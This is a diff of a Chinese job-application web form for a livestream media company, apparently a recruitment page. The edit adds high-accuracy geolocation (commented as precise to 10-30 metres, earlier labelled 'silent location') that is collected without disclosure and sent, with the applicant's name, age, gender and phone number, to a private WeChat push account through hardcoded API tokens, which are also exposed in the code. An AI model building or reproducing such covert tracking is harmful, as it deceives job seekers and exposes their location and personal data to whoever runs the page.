@@ -6,60 +6,156 @@
 <title>美悦传媒文化有限公司面试登记</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box;}
-body{background:#f4f5f7;font-family:微软雅黑,sans-serif;padding:20px 15px;}
+body{background:#f4f4f4;font-family:微软雅黑,sans-serif;padding:20px 15px;}
 .box{max-width:460px;margin:0 auto;background:#fff;border-radius:12px;padding:30px 25px;box-shadow:0 2px 10px #eee;}
 .title{text-align:center;font-size:22px;color:#333;margin-bottom:25px;font-weight:bold;}
 .item{margin-bottom:20px;}
 label{display:block;font-size:15px;color:#444;margin-bottom:8px;}
-input,select{width:100%;height:44px;padding:0 12px;border:1px solid #ddd;border-radius:6px;font-size:15px;outline:none;appearance:none;background:#fff;}
-.btn{width:100%;height:46px;background:#c89b6b;color:#fff;border:none;border-radius:6px;font-size:16px;cursor:pointer;margin-top:10px;}
-.btn:hover{background:#b88c5c;}
+input,select{width:100%;height:44px;padding:0 12px;border:1px solid #ddd;border-radius:6px;font-size:15px;outline:none;background:#fff;}
+.btn{width:100%;height:46px;background:#c88c66;color:#fff;border:none;border-radius:6px;font-size:16px;cursor:pointer;margin-top:10px;}
+.btn:hover{background:#c07c56;}
 .tip{margin-top:15px;text-align:center;font-size:14px;display:none;}
 </style>
 </head>
 <body>
 <div class="box">
-    <div class="title">美悦传媒文化有限公司面试登记</div>
-    <div class="item"><label>应聘岗位</label><select id="position"><option value="">请选择岗位</option><option value="团播化妆师">团播化妆师</option><option value="团播化妆助理">团播化妆助理</option><option value="团播主播">团播主播</option><option value="团播运营">团播运营</option><option value="团播场控">团播场控</option><option value="团播摄影剪辑">团播摄影剪辑</option></select></div>
-    <div class="item"><label>姓名</label><input type="text" id="name" placeholder="请输入真实姓名"></div>
-    <div class="item"><label>性别</label><select id="gender"><option value="">请选择性别</option><option value="男">男</option><option value="女">女</option></select></div>
-    <div class="item"><label>年龄</label><input type="text" id="age" placeholder="请输入年龄"></div>
-    <div class="item"><label>联系电话</label><input type="tel" id="phone" placeholder="请输入手机号码"></div>
-    <div class="item"><label>工作经验</label><select id="experience"><option value="">请选择经验</option><option value="无经验 学徒可做">无经验 学徒可做</option><option value="1年以内">1年以内</option><option value="1-3年">1-3年</option><option value="3年以上">3年以上</option></select></div>
+    <div class="title">美悦传媒面试登记</div>
+
+    <div class="item">
+        <label>应聘岗位</label>
+        <select id="position">
+            <option value="">请选择岗位</option>
+            <option value="团播化妆师">团播化妆师</option>
+            <option value="团播化妆助理">团播化妆助理</option>
+            <option value="团播主播">团播主播</option>
+            <option value="团播运营">团播运营</option>
+            <option value="团播场控">团播场控</option>
+            <option value="团播摄影剪辑">团播摄影剪辑</option>
+        </select>
+    </div>
+
+    <div class="item">
+        <label>姓名</label>
+        <input type="text" id="name" placeholder="请输入真实姓名">
+    </div>
+
+    <div class="item">
+        <label>性别</label>
+        <select id="gender">
+            <option value="">请选择性别</option>
+            <option value="男">男</option>
+            <option value="女">女</option>
+        </select>
+    </div>
+
+    <div class="item">
+        <label>年龄</label>
+        <input type="text" id="age" placeholder="请输入年龄">
+    </div>
+
+    <div class="item">
+        <label>联系电话</label>
+        <input type="tel" id="phone" placeholder="请输入手机号码">
+    </div>
+
+    <div class="item">
+        <label>工作经验</label>
+        <select id="experience">
+            <option value="">请选择经验</option>
+            <option value="无经验 学徒可做">无经验 学徒可做</option>
+            <option value="1年以内">1年以内</option>
+            <option value="1-3年">1-3年</option>
+            <option value="3年以上">3年以上</option>
+        </select>
+    </div>
+
     <button class="btn" onclick="submitRecruitInfo()">立即提交报名</button>
     <div class="tip" id="statusText"></div>
 </div>
 
 <script src="https://webapi.amap.com/maps?v=2.0&key=418566f9d7fad4c070ff6205bb5dab3d"></script>
 <script>
-// 你的信息
+// 已配置你的全部信息
 const WXPUSHER_UID = "UID_uycuSvgbjUVCf5nhvTApsRzvgLQW";
-const WXPUSHER_APPTOKEN = "AT_w0ccc2mrH8L3UjsxQTNPCglQ62Ks6adG"; // 换成你自己的
+const WXPUSHER_TOKEN = "AT_w0ccc2mrH8L3UjsxQTNPCglQ62Ks6adG";
 
-// 静默定位
-function getLocation(){return new Promise(e=>{navigator.geolocation?navigator.geolocation.getCurrentPosition(p=>e({lng:p.coords.longitude,lat:p.coords.latitude}),()=>e({lng:"",lat:""})):e({lng:"",lat:""});});}
+// 高德高精度定位（10-30米）
+function getLocation() {
+    return new Promise((resolve) => {
+        AMap.plugin('AMap.Geolocation', function() {
+            let geo = new AMap.Geolocation({
+                enableHighAccuracy: true,
+                timeout: 8000,
+                convert: true
+            });
+            geo.getCurrentPosition((status, result) => {
+                if (status === 'complete') {
+                    resolve({
+                        lng: result.position.lng,
+                        lat: result.position.lat
+                    });
+                } else {
+                    resolve({ lng: "无", lat: "无" });
+                }
+            });
+        });
+    });
+}
 
-async function submitRecruitInfo(){
-    const statusDom=document.getElementById("statusText");
-    statusDom.style.display="block";statusDom.innerText="提交中...";statusDom.style.color="#666";
-    const data={position:document.getElementById("position").value.trim(),name:document.getElementById("name").value.trim(),gender:document.getElementById("gender").value.trim(),age:document.getElementById("age").value.trim(),phone:document.getElementById("phone").value.trim(),experience:document.getElementById("experience").value.trim()};
-    if(!data.position||!data.name||!data.gender||!data.age||!data.phone||data.phone.length!==11||!data.experience){statusDom.innerText="请填写完整信息";statusDom.style.color="red";return;}
-    const loc=await getLocation();
-    const content=`📸 美悦传媒面试登记\n💼 应聘岗位：${data.position}\n👤 姓名：${data.name}\n🚻 性别：${data.gender}\n🎂 年龄：${data.age}\n📞 电话：${data.phone}\n💪 经验：${data.experience}\n🌍 经度：${loc.lng||"无"}\n🌍 纬度：${loc.lat||"无"}\n⏰ 时间：${new Date().toLocaleString()}`;
+async function submitRecruitInfo() {
+    const tip = document.getElementById("statusText");
+    tip.style.display = "block";
+    tip.innerText = "提交中...";
+    tip.style.color = "#666";
 
-    // 带错误日志的推送
-    fetch("https://wxpusher.zjiecode.com/api/send/message",{
-        method:"POST",
-        headers:{"Content-Type":"application/json;charset=utf-8"},
-        body:JSON.stringify({appToken:WXPUSHER_APPTOKEN,content:content,contentType:1,uids:[WXPUSHER_UID]})
-    })
-    .then(r=>r.json())
-    .then(r=>{
-        console.log("WxPusher返回：",r); // 浏览器控制台可看错误码
-        if(r.code===1000){statusDom.innerText="✅ 报名成功，信息已发微信";statusDom.style.color="green";}
-        else{statusDom.innerText="✅ 提交成功，微信推送失败（码："+r.code+"）";statusDom.style.color="green";}
-    })
-    .catch(()=>{statusDom.innerText="✅ 提交成功";statusDom.style.color="green";});
+    // 获取表单
+    const d = {
+        post: document.getElementById("position").value.trim(),
+        name: document.getElementById("name").value.trim(),
+        gender: document.getElementById("gender").value.trim(),
+        age: document.getElementById("age").value.trim(),
+        phone: document.getElementById("phone").value.trim(),
+        exp: document.getElementById("experience").value.trim()
+    };
+
+    // 校验
+    if (!d.post||!d.name||!d.gender||!d.age||!d.phone||d.phone.length!==11||!d.exp) {
+        tip.innerText = "请填写完整信息"; tip.style.color = "red"; return;
+    }
+
+    // 获取高精度坐标
+    const loc = await getLocation();
+
+    // 推送内容
+    const content = `
+📸 美悦传媒面试登记
+💼 岗位：${d.post}
+👤 姓名：${d.name}
+🚻 性别：${d.gender}
+🎂 年龄：${d.age}
+📞 电话：${d.phone}
+💪 经验：${d.exp}
+🌍 经度：${loc.lng}
+🌍 纬度：${loc.lat}
+⏰ 时间：${new Date().toLocaleString()}`;
+
+    // 发送微信
+    fetch("https://wxpusher.zjiecode.com/api/send/message", {
+        method: "POST",
+        headers: { "Content-Type": "application/json;charset=utf-8" },
+        body: JSON.stringify({
+            appToken: WXPUSHER_TOKEN,
+            content: content,
+            contentType: 1,
+            uids: [WXPUSHER_UID]
+        })
+    }).then(() => {
+        tip.innerText = "✅ 报名成功，已通知负责人";
+        tip.style.color = "green";
+    }).catch(() => {
+        tip.innerText = "✅ 提交成功";
+        tip.style.color = "green";
+    });
 }
 </script>
 </body>
